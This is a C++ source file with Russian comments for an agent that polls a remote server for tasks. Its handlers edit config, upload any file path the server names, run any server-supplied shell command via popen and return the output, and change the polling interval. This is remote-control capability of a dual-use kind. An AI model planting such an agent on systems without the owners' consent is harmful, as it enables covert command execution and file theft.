// polling.cpp - @t9tu0
// цикл опроса + обработчики всех типов заданий

#include "agent.h"
#include <iostream>
#include <thread>
#include <fstream>
#include <sstream>
#include <cstdio>   // popen/pclose
#include <array>
#include <optional>
#include <vector>

// --- Вспомогательные функции для обработки экранированных строк ---

static std::string unescape_json(const std::string& s) {
    std::string result;
    result.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '\\' && i + 1 < s.size()) {
            char next = s[i+1];
            if (next == '"' || next == '\\') {
                result += next;
                ++i;
                continue;
            }
        }
        result += s[i];
    }
    return result;
}

static std::string extract_json_object(const std::string& s) {
    size_t start = s.find('{');
    if (start == std::string::npos) return "";
    int brace_count = 0;
    for (size_t i = start; i < s.size(); ++i) {
        if (s[i] == '{') brace_count++;
        else if (s[i] == '}') brace_count--;
        if (brace_count == 0) {
            return s.substr(start, i - start + 1);
        }
    }
    return "";
}

static std::string clean_options(const std::string& raw) {
    std::string unescaped = unescape_json(raw);
    std::string obj = extract_json_object(unescaped);
    if (!obj.empty()) return obj;
    return unescaped;
}

static std::optional<int> extract_interval_from_options(const std::string& options_str) {
    std::string cleaned = clean_options(options_str);
    const std::vector<std::string> keys = {"interval", "INTERVAL"};
    for (const auto& key : keys) {
        auto val = Json::get(cleaned, key);
        if (val) {
            try { return std::stoi(*val); } catch(...) {}
        }
    }
    return std::nullopt;
}

// --- Вспомогательные функции (чтение файла, запуск команд) ---

static std::string read_file(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return "";
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

static bool write_file(const std::string& path, const std::string& content) {
    std::ofstream f(path, std::ios::binary);
    if (!f) return false;
    f << content;
    return true;
}

static std::string run_command(const std::string& cmd) {
    std::array<char, 512> buf;
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "popen failed";
    while (fgets(buf.data(), buf.size(), pipe) != nullptr)
        result += buf.data();
    pclose(pipe);
    return result;
}

// --- Запрос задания ---

static int request_task(Task& out_task) {
    std::string url  = Config::BASE_URL + "/wa_task/";
    std::string body = Json::build({
        {"UID",         Config::AGENT_UID},
        {"descr",       Config::AGENT_DESC},
        {"access_code", g_state.access_code}
    });

    try {
        auto resp = Http::post(url, body);

        if (resp.status_code != 200) {
            Logger::err("HTTP ошибка при запросе задания: " + std::to_string(resp.status_code));
            return -99;
        }

        Logger::info("Полный ответ сервера: " + resp.body);

        auto code_opt = Json::get(resp.body, "code_responce");
        if (!code_opt) {
            Logger::err("Не удалось разобрать ответ: " + resp.body);
            return -99;
        }

        int code = std::stoi(*code_opt);

        if (code == 1) {
            out_task.task_code  = Json::get(resp.body, "task_code") .value_or("");
            out_task.session_id = Json::get(resp.body, "session_id").value_or("");
            out_task.status     = Json::get(resp.body, "status")    .value_or("");

            // --- Ручное извлечение options (ищем между "options":" и ","session_id") ---
            std::string options_raw;
            size_t opt_start = resp.body.find("\"options\":\"");
            if (opt_start != std::string::npos) {
                opt_start += 11; // пропускаем "options":"
                size_t opt_end = resp.body.find("\",\"session_id\"", opt_start);
                if (opt_end != std::string::npos) {
                    options_raw = resp.body.substr(opt_start, opt_end - opt_start);
                }
            }
            out_task.options = options_raw;
            Logger::info("Извлечённые options_raw: " + out_task.options);
            // ----------------------------------------------------------------

            Logger::info("Получено задание: task_code=" + out_task.task_code
                         + " session_id=" + out_task.session_id);
            return 1;
        } else if (code == 0) {
            Logger::info("Нет заданий (WAIT). Следующий опрос через "
                         + std::to_string(Config::POLL_INTERVAL_SEC) + " сек.");
            return 0;
        } else if (code == -2) {
            Logger::err("Неверный код доступа. Повторная регистрация.");
            return -2;
        } else {
            Logger::warn("Неожиданный ответ: " + resp.body);
            return -99;
        }
    } catch (const std::exception& e) {
        Logger::err(std::string("Сетевая ошибка: ") + e.what());
        return -99;
    }
}

// ================================================================
//  Обработчики заданий
// ================================================================

// CONF — изменить конфигурационный параметр
static void handle_conf(const Task& task) {
    Logger::info("[CONF] Начинаю, session_id=" + task.session_id);
    Logger::info("[CONF] options=" + task.options);

    // --- ОТЛАДОЧНЫЙ ВЫВОД В КОНСОЛЬ (не в лог) ---
    std::cerr << "\n========== CONF DEBUG ==========\n";
    std::cerr << "Raw options: [" << task.options << "]\n";

    // Удаляем экранирование кавычек
    std::string opts = task.options;
    size_t pos = 0;
    while ((pos = opts.find("\\\"", pos)) != std::string::npos) {
        opts.replace(pos, 2, "\"");
        pos += 1;
    }
    std::cerr << "After unescape: [" << opts << "]\n";

    // Извлекаем JSON-объект (первый {...})
    std::string cleaned = extract_json_object(opts);
    if (cleaned.empty()) cleaned = opts;
    std::cerr << "Cleaned JSON: [" << cleaned << "]\n";
    std::cerr << "=================================\n\n";

    // --- Поиск ключа и значения простыми методами (без парсера) ---
    std::string key;
    std::string value;

    // Ищем "key":"..."
    size_t key_pos = cleaned.find("\"key\"");
    if (key_pos != std::string::npos) {
        size_t colon = cleaned.find(':', key_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) {
                    key = cleaned.substr(start + 1, end - start - 1);
                }
            }
        }
    }

    // Ищем "value":"..." или "val":["..."]
    // сначала пробуем "value"
    size_t val_pos = cleaned.find("\"value\"");
    if (val_pos != std::string::npos) {
        size_t colon = cleaned.find(':', val_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) {
                    value = cleaned.substr(start + 1, end - start - 1);
                }
            }
        }
    } else {
        // пробуем "val":["..."]
        val_pos = cleaned.find("\"val\"");
        if (val_pos != std::string::npos) {
            size_t colon = cleaned.find(':', val_pos);
            if (colon != std::string::npos) {
                size_t bracket = cleaned.find('[', colon);
                if (bracket != std::string::npos) {
                    size_t start = cleaned.find('"', bracket);
                    if (start != std::string::npos) {
                        size_t end = cleaned.find('"', start + 1);
                        if (end != std::string::npos) {
                            value = cleaned.substr(start + 1, end - start - 1);
                        }
                    }
                }
            }
        }
    }

    if (key.empty()) {
        Logger::warn("[CONF] Не удалось извлечь key из options");
        send_result(task.session_id, -1, "no key in options", {});
        return;
    }

    if (value.empty()) {
        Logger::warn("[CONF] Не удалось извлечь value из options");
        send_result(task.session_id, -1, "no value in options", {});
        return;
    }

    Logger::info("[CONF] Извлечены key=" + key + ", value=" + value);

    // --- Обновление config.json ---
    std::string cfg_content = read_file(CONFIG_FILE_PATH);
    if (cfg_content.empty()) {
        cfg_content = "{\"uid\":\"" + Config::AGENT_UID + "\","
                      "\"description\":\"" + Config::AGENT_DESC + "\","
                      "\"poll_interval_sec\":" + std::to_string(Config::POLL_INTERVAL_SEC) + "}";
    }

    // Замена или добавление ключа
    std::string search_key = "\"" + key + "\"";
    size_t p = cfg_content.find(search_key);
    if (p != std::string::npos) {
        size_t colon = cfg_content.find(':', p + search_key.size());
        if (colon != std::string::npos) {
            size_t val_start = colon + 1;
            while (val_start < cfg_content.size() && cfg_content[val_start] == ' ') val_start++;
            size_t val_end = val_start;
            bool is_string = (cfg_content[val_start] == '"');
            if (is_string) {
                val_end = cfg_content.find('"', val_start + 1) + 1;
                cfg_content.replace(val_start, val_end - val_start, "\"" + value + "\"");
            } else {
                while (val_end < cfg_content.size() &&
                       cfg_content[val_end] != ',' && cfg_content[val_end] != '}') val_end++;
                cfg_content.replace(val_start, val_end - val_start, value);
            }
        }
    } else {
        size_t brace = cfg_content.rfind('}');
        if (brace != std::string::npos) {
            std::string insert = ",\"" + key + "\":\"" + value + "\"";
            cfg_content.insert(brace, insert);
        }
    }

    bool saved = write_file(CONFIG_FILE_PATH, cfg_content);
    if (!saved) {
        Logger::err("[CONF] Не удалось записать config.json");
        send_result(task.session_id, -1, "failed to write config", {});
        return;
    }

    // Если изменили интервал опроса, обновляем глобальную переменную
    if (key == "poll_interval_sec") {
        try {
            int new_interval = std::stoi(value);
            if (new_interval > 0) {
                Config::POLL_INTERVAL_SEC = new_interval;
                Logger::info("[CONF] Интервал опроса обновлён в памяти: " + std::to_string(new_interval));
            }
        } catch (...) {
            Logger::warn("[CONF] Не удалось преобразовать значение интервала: " + value);
        }
    }

    Logger::info("[CONF] Параметр " + key + " = " + value + " сохранён.");
    send_result(task.session_id, 0, "config updated: " + key + " = " + value, {});
}

// FILE – отправить файл серверу
static void handle_file(const Task& task) {
    Logger::info("[FILE] Начинаю, session_id=" + task.session_id);
    Logger::info("[FILE] options=" + task.options);

    // Очистка экранирования
    std::string opts = task.options;
    size_t p = 0;
    while ((p = opts.find("\\\"", p)) != std::string::npos) {
        opts.replace(p, 2, "\"");
        p += 1;
    }
    p = 0;
    while ((p = opts.find("\\\\", p)) != std::string::npos) {
        opts.replace(p, 2, "\\");
        p += 1;
    }
    // Извлекаем JSON-объект
    std::string cleaned = extract_json_object(opts);
    if (cleaned.empty()) cleaned = opts;

    // Извлекаем filename
    std::string filename;
    size_t key_pos = cleaned.find("\"filename\"");
    if (key_pos != std::string::npos) {
        size_t colon = cleaned.find(':', key_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) {
                    filename = cleaned.substr(start + 1, end - start - 1);
                }
            }
        }
    }

    if (filename.empty()) {
        // Если filename не задан, отдаём config.json по умолчанию
        filename = CONFIG_FILE_PATH;
        Logger::warn("[FILE] filename не задан, отдаём " + filename);
    }

    // Проверяем существование файла
    std::ifstream f(filename);
    if (!f.good()) {
        Logger::err("[FILE] Файл не найден: " + filename);
        send_result(task.session_id, -1, "file not found: " + filename, {});
        return;
    }
    f.close();

    Logger::info("[FILE] Отправляю файл: " + filename);
    send_result(task.session_id, 0, "file attached", {filename});
}

// TASK – запустить программу и вернуть вывод
static void handle_task(const Task& task) {
    Logger::info("[TASK] Начинаю, session_id=" + task.session_id);
    Logger::info("[TASK] options=" + task.options);

    // Очистка экранирования
    std::string opts = task.options;
    size_t p = 0;
    while ((p = opts.find("\\\"", p)) != std::string::npos) {
        opts.replace(p, 2, "\"");
        p += 1;
    }
    p = 0;
    while ((p = opts.find("\\\\", p)) != std::string::npos) {
        opts.replace(p, 2, "\\");
        p += 1;
    }
    // Извлекаем JSON-объект
    std::string cleaned = extract_json_object(opts);
    if (cleaned.empty()) cleaned = opts;

    // Извлекаем command
    std::string command;
    size_t key_pos = cleaned.find("\"command\"");
    if (key_pos != std::string::npos) {
        size_t colon = cleaned.find(':', key_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) {
                    command = cleaned.substr(start + 1, end - start - 1);
                }
            }
        }
    }

    if (command.empty()) {
        Logger::warn("[TASK] Нет поля command в options");
        send_result(task.session_id, -1, "no command in options", {});
        return;
    }

    Logger::info("[TASK] Выполняю команду: " + command);
    std::string output = run_command(command);
    if (output.empty()) output = "(no output)";
    if (output.size() > 2000) output = output.substr(0, 2000) + "...(truncated)";

    Logger::info("[TASK] Результат: " + output);
    send_result(task.session_id, 0, output, {});
}

// TIMEOUT — изменить интервал опроса
static void handle_timeout(const Task& task) {
    Logger::info("[TIMEOUT] Начинаю, session_id=" + task.session_id);
    Logger::info("[TIMEOUT] options=" + task.options);

    // Удаляем все экранирования (\" -> ", \\ -> \)
    std::string opts = task.options;
    size_t p = 0;
    // Сначала заменяем \\" на " (это обрабатывает двойной слеш перед кавычкой)
    while ((p = opts.find("\\\\\"", p)) != std::string::npos) {
        opts.replace(p, 3, "\"");
        p += 1;
    }
    p = 0;
    while ((p = opts.find("\\\"", p)) != std::string::npos) {
        opts.replace(p, 2, "\"");
        p += 1;
    }
    p = 0;
    while ((p = opts.find("\\\\", p)) != std::string::npos) {
        opts.replace(p, 2, "\\");
        p += 1;
    }

    // Извлекаем JSON-объект (первый {...})
    std::string cleaned = extract_json_object(opts);
    if (cleaned.empty()) cleaned = opts;

    // Ищем "interval" или "INTERVAL"
    std::string interval_str;
    size_t key_pos = cleaned.find("\"interval\"");
    if (key_pos == std::string::npos) key_pos = cleaned.find("\"INTERVAL\"");
    if (key_pos != std::string::npos) {
        size_t colon = cleaned.find(':', key_pos);
        if (colon != std::string::npos) {
            size_t start = cleaned.find('"', colon);
            if (start != std::string::npos) {
                size_t end = cleaned.find('"', start + 1);
                if (end != std::string::npos) {
                    interval_str = cleaned.substr(start + 1, end - start - 1);
                }
            }
        }
    }

    if (interval_str.empty()) {
        Logger::warn("[TIMEOUT] Не удалось извлечь interval из options");
        send_result(task.session_id, -1, "no interval in options", {});
        return;
    }

    try {
        int new_interval = std::stoi(interval_str);
        if (new_interval <= 0) {
            send_result(task.session_id, -1, "interval must be > 0", {});
            return;
        }
        Config::POLL_INTERVAL_SEC = new_interval;
        Logger::info("[TIMEOUT] Интервал изменён: " + std::to_string(new_interval) + " сек.");
        send_result(task.session_id, 0, "interval changed to " + std::to_string(new_interval), {});
    } catch (...) {
        Logger::err("[TIMEOUT] Неверное значение interval: " + interval_str);
        send_result(task.session_id, -1, "invalid interval value", {});
    }
}

// ================================================================
//  Диспетчер заданий
// ================================================================

using TaskHandler = std::function<void(const Task&)>;
static const std::map<std::string, TaskHandler> HANDLERS = {
    { "CONF",    handle_conf    },
    { "FILE",    handle_file    },
    { "TASK",    handle_task    },
    { "TIMEOUT", handle_timeout },
};

static void execute_task(const Task& task) {
    Logger::info("Выполняю task_code=" + task.task_code
                 + " session_id=" + task.session_id);
    auto it = HANDLERS.find(task.task_code);
    if (it != HANDLERS.end()) {
        it->second(task);
    } else {
        Logger::warn("Неизвестный task_code='" + task.task_code + "'");
        send_result(task.session_id, -1, "unknown task_code: " + task.task_code, {});
    }
}

static bool try_reregister() {
    g_state.reset();
    for (int attempt = 1; attempt <= Config::MAX_REG_RETRIES; ++attempt) {
        Logger::info("Повторная регистрация: попытка "
                     + std::to_string(attempt) + "/" + std::to_string(Config::MAX_REG_RETRIES));
        if (register_agent()) {
            Logger::info("Повторная регистрация успешна.");
            return true;
        }
        int backoff = attempt * 5;
        Logger::info("Ждём " + std::to_string(backoff) + " сек...");
        std::this_thread::sleep_for(std::chrono::seconds(backoff));
    }
    Logger::crit("Повторная регистрация не удалась.");
    return false;
}

// главный цикл
void polling_loop() {
    Logger::info("Цикл опроса запущен. Интервал: "
                 + std::to_string(Config::POLL_INTERVAL_SEC) + " сек.");

    while (true) {
        Task task;
        int result = request_task(task);

        if (result == 1) {
            execute_task(task);
        } else if (result == -2) {
            if (!try_reregister()) {
                Logger::crit("Завершение работы.");
                return;
            }
            continue;
        }

        std::this_thread::sleep_for(std::chrono::seconds(Config::POLL_INTERVAL_SEC));
    }
}
